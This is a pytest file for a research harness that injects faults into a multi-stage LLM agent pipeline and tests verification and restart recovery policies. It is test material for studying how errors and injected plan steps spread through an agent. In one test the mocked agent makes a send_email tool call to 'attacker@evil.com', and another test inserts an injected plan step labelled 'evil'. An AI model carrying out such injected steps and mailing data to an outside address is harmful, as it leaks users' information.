"""Tests pinning the whole-branch review findings (2026-10-21)."""

import json
from types import SimpleNamespace

import pandas as pd

from mar.artifacts import ExecutedStep, PlanStep
from mar.env import Env
from mar.faults import FaultTemplate
from mar.judge import exact_diff, match_artifacts
from mar.llm import OpenAICompatibleClient
from mar.metrics import aggregate, counterfactual_changed
from mar.recovery import AlwaysVerify, RestartScratch
from mar.run import RunRecord, run_experiment, run_pipeline
from tests.test_llm import _fake_openai

GT = Env("workspace", "user_task_0").task.GROUND_TRUTH_OUTPUT
DATE_FAULT = FaultTemplate(id="date", stage="finding", type="accidental", strength="obvious", description="d",
                           op="regex_replace", payload={"pattern": r"\d{4}-\d{2}-\d{2}", "replacement": "2031-01-01"})
PLAN = json.dumps({"steps": [{"instruction": "report", "cites": ["user_task_0:f0"]}]})


def findings(text):
    return json.dumps({"findings": [{"source": "calendar", "content": text}]})


# 1. always-verify must see the faulted artifact
def test_verifier_sees_the_injected_fault(tmp_path, fake_llm_responses, resp):
    ok = resp(content=json.dumps({"ok": True, "reason": "fine"}))
    llm = fake_llm_responses(resp(content="ok"), resp(content=findings("on 2024-05-26: " + GT)), ok, resp(content=PLAN), ok, resp(content=GT))
    env = Env("workspace", "user_task_0")
    run_pipeline(env, llm, RunRecord.start(tmp_path, {"run_id": "r"}), "user_task_0", fault=(DATE_FAULT, 0), policy=AlwaysVerify())
    verifier_inputs = [c["messages"][-1]["content"] for c in llm.calls if c["schema"] is not None and '"ok"' in json.dumps(c["schema"])]
    assert "2031-01-01" in verifier_inputs[0]


def test_regeneration_after_rejection_is_not_reinjected(tmp_path, fake_llm_responses, resp):
    reject = resp(content=json.dumps({"ok": False, "reason": "bad"}))
    ok = resp(content=json.dumps({"ok": True, "reason": "fine"}))
    clean = resp(content=findings("on 2024-05-26: " + GT))
    llm = fake_llm_responses(resp(content="ok"), clean, reject, resp(content="ok"), clean, ok, resp(content=PLAN), ok, resp(content=GT))
    env = Env("workspace", "user_task_0")
    record = RunRecord.start(tmp_path, {"run_id": "r"})
    result = run_pipeline(env, llm, record, "user_task_0", fault=(DATE_FAULT, 0), policy=AlwaysVerify())
    assert result.verifier_rejections == 1
    assert "2031-01-01" not in record.graph.artifacts["user_task_0:f0"].content["text"]


# 2. tool action ids must survive a restart
def test_irreversible_action_survives_restart_scratch(tmp_path, fake_llm_responses, resp):
    email = {"id": "c1", "name": "send_email", "args": {"recipients": ["attacker@evil.com"], "subject": "s", "body": "b"}}
    llm = fake_llm_responses(
        resp(content="ok"), resp(content=findings("on 2024-05-26: " + GT)), resp(content=PLAN),
        resp(tool_calls=[email]), resp(content="sent"),
        resp(content="ok"), resp(content=findings(GT)), resp(content=PLAN), resp(content=GT),
    )
    env = Env("workspace", "user_task_0")
    record = RunRecord.start(tmp_path, {"run_id": "r"})
    result = run_pipeline(env, llm, record, "user_task_0", fault=(DATE_FAULT, 0), policy=RestartScratch())
    assert result.recovered and result.utility
    irreversible = [a for a in record.graph.tool_actions.values() if a.action_class == "irreversible"]
    assert len(irreversible) == 1 and len(record.graph.tool_actions) == 1
    assert len({a.id for a in record.graph.tool_actions.values()}) == len([e for e in record.events if e["kind"] == "tool_action"])


# 3. insert_step must not shift matching
def test_insert_step_only_changes_its_own_execution(build_run):
    faulted = build_run("a", ["x"], [("s0", ["t:f0"]), ("s1", ["t:f0"]), ("s2", ["t:f0"])], ["e0", "e1", "e2"])
    injected = PlanStep(id="t:p0-injected", producer="p", task_id="t", index=1, cites=["t:f0"], content={"instruction": "evil", "fault": "x"})
    faulted.add_artifact(injected)
    faulted.add_artifact(ExecutedStep(id="t:exec:t:p0-injected", producer="e", task_id="t", plan_step_id=injected.id, cites=[injected.id], content={"output": "sent"}))
    twin = build_run("b", ["x"], [("s0", ["t:f0"]), ("s1", ["t:f0"]), ("s2", ["t:f0"])], ["e0", "e1", "e2"])
    assert counterfactual_changed(faulted, twin, "t:p0-injected") == {"t:exec:t:p0-injected"}


def test_match_artifacts_pairs_by_id(build_run):
    a = build_run("a", ["x", "y"], [("s", ["t:f0"])])
    b = build_run("b", ["x"], [("s", ["t:f0"])])
    pairs = {(p[0].id if p[0] else None, p[1].id if p[1] else None) for p in match_artifacts(a.graph, b.graph)}
    assert pairs == {("t:f0", "t:f0"), ("t:f1", None), ("t:p0", "t:p0")}


# 4. non-dict tool arguments are an args_error
def test_non_dict_tool_arguments_do_not_reach_the_tool():
    for raw in ("null", "[1, 2]", '"x"'):
        tc = SimpleNamespace(id="c1", function=SimpleNamespace(name="f", arguments=raw))
        call = OpenAICompatibleClient("m", 0.0, 1, client=_fake_openai(SimpleNamespace(content=None, tool_calls=[tc]))).complete([]).tool_calls[0]
        assert call["args"] == {} and "args_error" in call


# 5. a failing job writes an error result and the batch continues
def test_failing_job_is_recorded_and_batch_continues(tmp_path, fake_llm_responses):
    import yaml
    tasks_path = tmp_path / "tasks.yaml"
    tasks_path.write_text(yaml.safe_dump({"benchmark_version": "v1.2", "suites": {"workspace": ["user_task_0"]}}))
    config_path = tmp_path / "exp.yaml"
    (tmp_path / "no_templates").mkdir()
    config_path.write_text(yaml.safe_dump({"name": "s", "model": {"name": "fake"}, "tasks": str(tasks_path), "repeats": 2,
                                           "conditions": ["none"], "fault_templates": str(tmp_path / "no_templates")}))
    paths = run_experiment(config_path, "dev", tmp_path / "runs", resume=False, llm=fake_llm_responses())
    results = [json.loads((p / "result.json").read_text()) for p in paths]
    assert len(results) == 2 and all("error" in r and r["utility"] is False for r in results)


# 6. starting a run id again does not keep stale events
def test_start_truncates_stale_events(tmp_path):
    first = RunRecord.start(tmp_path, {"run_id": "r"})
    first.emit("artifact", id="x")
    second = RunRecord.start(tmp_path, {"run_id": "r"})
    second.emit("artifact", id="y")
    assert len((tmp_path / "r" / "events.jsonl").read_text().splitlines()) == 1


# 7. aggregation computes the noise floor; baseline plots exclude unapplied faults
def test_aggregate_adds_noise_floor_columns_for_clean_repeats(tmp_path, build_run):
    for repeat, text in ((0, "x"), (1, "y")):
        r = build_run(f"c{repeat}", [text], [("s", ["t:f0"])])
        r.manifest.update(task_id="t", condition="none", fault_id=None, repeat=repeat)
        r.finish({"utility": True})
    df = aggregate(tmp_path, tmp_path / "agg.parquet")
    assert df["floor_findings"].tolist() == [1.0, 1.0] and df["floor_plan_steps"].tolist() == [0.0, 0.0]


def test_baseline_groups_exclude_unapplied_faults():
    from scripts.plots import baseline_groups
    df = pd.DataFrame({"condition": ["none", "none", "none"], "fault_id": ["a", "a", None],
                       "fault_applied": [True, False, None], "utility": [False, True, True], "llm_calls": [1, 2, 3]})
    assert baseline_groups(df, "utility") == {"none": [0.0]}


# 8. exact_diff ignores metadata
def test_exact_diff_compares_text_not_metadata():
    a = PlanStep(id="p", producer="p", task_id="t", index=0, content={"instruction": "do", "retries": 0})
    b = PlanStep(id="p", producer="p", task_id="t", index=0, content={"instruction": "do", "retries": 2, "verified": True})
    assert exact_diff(a, b) is False
    assert exact_diff(a, b.model_copy(update={"content": {"instruction": "other"}})) is True


def test_plots_prefer_judged_taint_columns_when_present():
    from scripts.plots import taint_column

    exact_only = pd.DataFrame({"ignored": [True]})
    both = pd.DataFrame({"ignored": [True], "judged_ignored": [False]})
    assert taint_column(exact_only, "ignored") == "ignored"
    assert taint_column(both, "ignored") == "judged_ignored"
